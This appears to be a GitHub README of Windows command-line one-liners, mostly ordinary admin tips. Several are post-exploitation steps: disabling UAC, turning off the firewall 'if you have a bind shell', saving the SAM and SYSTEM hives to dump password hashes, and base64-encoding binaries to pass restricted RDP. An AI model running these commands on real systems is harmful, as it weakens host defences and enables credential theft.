<h3><a id="user-content-convert-between-vdi-vmdk-vhd-raw-disk-images-using-virtualbox" class="anchor" href="#convert-between-vdi-vmdk-vhd-raw-disk-images-using-virtualbox" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Convert Between VDI, VMDK, VHD, RAW disk images using VirtualBox</h3>

<pre><code>C:\&gt; vboxmanage clonehd myvdi.vdi myvmdk.vmdk --format VMDK
</code></pre>

<h3><a id="user-content-change-file-extensions-recurseively" class="anchor" href="#change-file-extensions-recurseively" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Change file extensions recurseively</h3>

<p><strong>csv to xls for eg</strong></p>

<pre><code>C:\Projects&gt; forfiles /S /M *.csv /C "cmd /c ren @file @fname.xls"
</code></pre>

<h3><a id="user-content-list-ips-of-running-virtualbox-machines" class="anchor" href="#list-ips-of-running-virtualbox-machines" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>List IPs of running VirtualBox machines</h3>

<pre><code>for /F %i in ('VBoxManage list runningvms') do VBoxManage guestproperty enumerate %i | find "IP"
</code></pre>

<h3><a id="user-content-windows-privilege-escalation" class="anchor" href="#windows-privilege-escalation" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Windows Privilege Escalation</h3>

<p><a href="http://www.slideshare.net/riyazwalikar/windows-privilege-escalation"><img src="https://1.bp.blogspot.com/-sxrnJZlu86Q/V1FYEzY7T_I/AAAAAAAAoTI/Oz4pCQ8kWv0YWFeHE2Fk0ppZ3fQrnHUuwCLcB/s1600/windows-zero-day-exploit.png" alt="Windows Privilege Escalation" style="max-width:100%;"></a></p>

<h3><a id="user-content-enumerate-packages-with-their-oem-inf-filenames" class="anchor" href="#enumerate-packages-with-their-oem-inf-filenames" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Enumerate packages with their oem inf filenames</h3>

<pre><code>C:\&gt; pnputil -e
</code></pre>

<h3><a id="user-content-install-a-driver-package-using-inf-file" class="anchor" href="#install-a-driver-package-using-inf-file" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Install a driver package using inf file</h3>

<pre><code>C:\&gt; pnputil -i -a path_to_inf
</code></pre>

<h3><a id="user-content-malware-hunting-with-mark-russinovich-and-the-sysinternals" class="anchor" href="#malware-hunting-with-mark-russinovich-and-the-sysinternals" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Malware Hunting with Mark Russinovich and the Sysinternals</h3>

<p><a href="https://www.youtube.com/watch?v=80vfTA9LrBM"><img src="https://camo.githubusercontent.com/6b3e069a3767ac14b74715d37bd3eddbdd4d9dcc/687474703a2f2f696d672e796f75747562652e636f6d2f76692f383076665441394c72424d2f302e6a7067" alt="Malware Hunting with Mark Russinovich and the Sysinternals Tools" data-canonical-src="http://img.youtube.com/vi/80vfTA9LrBM/0.jpg" style="max-width:100%;"></a></p>

<h3><a id="user-content-windows-nano-server-apis" class="anchor" href="#windows-nano-server-apis" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Windows Nano Server APIs</h3>

<p><a href="https://msdn.microsoft.com/en-us/library/mt588480(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/mt588480(v=vs.85).aspx</a></p>

<h3><a id="user-content-windows-wifi-hotspot-using-cmd" class="anchor" href="#windows-wifi-hotspot-using-cmd" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Windows wifi hotspot using cmd</h3>

<p>Starting a wifi hotspot using Windows cmd with ssid name <code>hotspotname</code> and key <code>password</code></p>

<p><a href="/madhuakula/wincmdfu/blob/master/images/wifihotspot.jpg" target="_blank"><img src="/madhuakula/wincmdfu/raw/master/images/wifihotspot.jpg" alt="Windows wifi hotspot using cmd" style="max-width:100%;"></a></p>

<h3><a id="user-content-disable-uac-via-cmdline" class="anchor" href="#disable-uac-via-cmdline" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Disable UAC via cmdline</h3>

<pre><code>C:\&gt; reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v EnableLUA /t REG_DWORD /d 0 /f
</code></pre>

<h3><a id="user-content-turn-off-windows-firewall-for-all-profiles" class="anchor" href="#turn-off-windows-firewall-for-all-profiles" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Turn off Windows firewall for all profiles</h3>

<p><strong>Useful if you have a bind shell</strong></p>

<pre><code>C:\&gt; netsh advfirewall set allprofiles state off
</code></pre>

<h3><a id="user-content-list-missing-updates" class="anchor" href="#list-missing-updates" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>List Missing Updates</h3>

<pre><code>PS C:\&gt; (New-Object -c Microsoft.Update.Session).CreateUpdateSearcher().Search("IsInstalled=0").Updates|Select Title
</code></pre>

<h3><a id="user-content-export-sam-and-system-dump-password-hashes-offline" class="anchor" href="#export-sam-and-system-dump-password-hashes-offline" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Export SAM and SYSTEM Dump password hashes offline</h3>

<pre><code>C:\&gt;reg save HKLM\SAM SAM
C:\&gt;reg save HKLM\SYSTEM SYSTEM
</code></pre>

<h3><a id="user-content-convert-binary-to-base64-string-to-transfer-across-restricted-rdp" class="anchor" href="#convert-binary-to-base64-string-to-transfer-across-restricted-rdp" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Convert Binary to base64 string to transfer across restricted RDP</h3>

<pre><code>PS C:\&gt; [Convert]::ToBase64String((gc -Pa "a.exe" -En By))
</code></pre>

<h3><a id="user-content-convert-base64-string-to-binary" class="anchor" href="#convert-base64-string-to-binary" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Convert Base64 string to Binary</h3>

<pre><code>PS C:\&gt; sc -Path "a.exe" -Val ([Convert]::FromBase64String((gc -Pa "b64.txt" ))) -En By
</code></pre>

<h3><a id="user-content-list-services-running-as-system-and-possibly-weak-file-permissions" class="anchor" href="#list-services-running-as-system-and-possibly-weak-file-permissions" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>List services running as SYSTEM and possibly weak file permissions</h3>

<pre><code>wmic service where StartName="LocalSystem"|findstr /IV ":\WIN :\PROG"
</code></pre>

<h3><a id="user-content-check-bitlocker-status-on-a-remote-box" class="anchor" href="#check-bitlocker-status-on-a-remote-box" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Check Bitlocker status on a remote box</h3>

<pre><code>manage-bde -status -cn &lt;box&gt;
</code></pre>

<p>Use <code>wmic /node:@ips.txt</code> &amp; <code>process</code> alias for multiple.</p>

<h3><a id="user-content-export-failed-logon-attempts" class="anchor" href="#export-failed-logon-attempts" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Export failed logon attempts</h3>

<pre><code>PS C:\&gt; Get-EventLog -Log Security | ?{$_.EntryType -eq 'FailureAudit'} | epcsv log.csv
</code></pre>

<h3><a id="user-content-alternate-data-streams-and-ps" class="anchor" href="#alternate-data-streams-and-ps" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Alternate Data Streams and PS</h3>

<ul>
<li>List all ADS for all files in current dir</li>
</ul>

<pre><code>PS C:\&gt; gi * -s *
</code></pre>

<ul>
<li>Read ADS</li>
</ul>

<pre><code>PS C:\&gt; gc &lt;file&gt; -s &lt;ADSName&gt;
</code></pre>

<ul>
<li>Create ADS using text input</li>
</ul>

<pre><code>PS C:\&gt; sc &lt;file&gt; -s &lt;ADSName&gt;
</code></pre>

<ul>
<li>Delete ADS</li>
</ul>

<pre><code>PS C:\&gt; ri &lt;file&gt; -s &lt;ADSName&gt;
</code></pre>

<h3><a id="user-content-run-the-windows-assessment-tool-for-cpu-and-ram-and-disk" class="anchor" href="#run-the-windows-assessment-tool-for-cpu-and-ram-and-disk" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Run the Windows Assessment tool for cpu and ram and disk</h3>

<pre><code>C:\&gt; winsat cpuformal -v
C:\&gt; winsat memformal -v
C:\&gt; winsat diskformal -v
</code></pre>

<h3><a id="user-content-port-forward-proxy-traffic-to-remote-host-and-port" class="anchor" href="#port-forward-proxy-traffic-to-remote-host-and-port" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Port forward (proxy) traffic to remote host and port</h3>

<pre><code>C:\&gt; netsh int p add v4tov4 &lt;LPORT&gt; &lt;RHOST&gt; [RPORT] [LHOST]
</code></pre>

<h3><a id="user-content-enabledisable-netbios-over-tcpip" class="anchor" href="#enabledisable-netbios-over-tcpip" aria-hidden="true"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Enable/Disable NetBIOS over TCP/IP</h3>

<pre><code>Step 1. Get Index of Network Adapter:
C:\&gt; wmic nicconfig get caption,index

Step 2. Use the index 
C:\&gt; wmic nicconfig where index=1 call SetTcpipNetbios 1

0-Def
1-En
2-Dis
</code></pre>
<h1> Thankyou for reading Now get your fuckin mind read and remind this shit !!</h1>
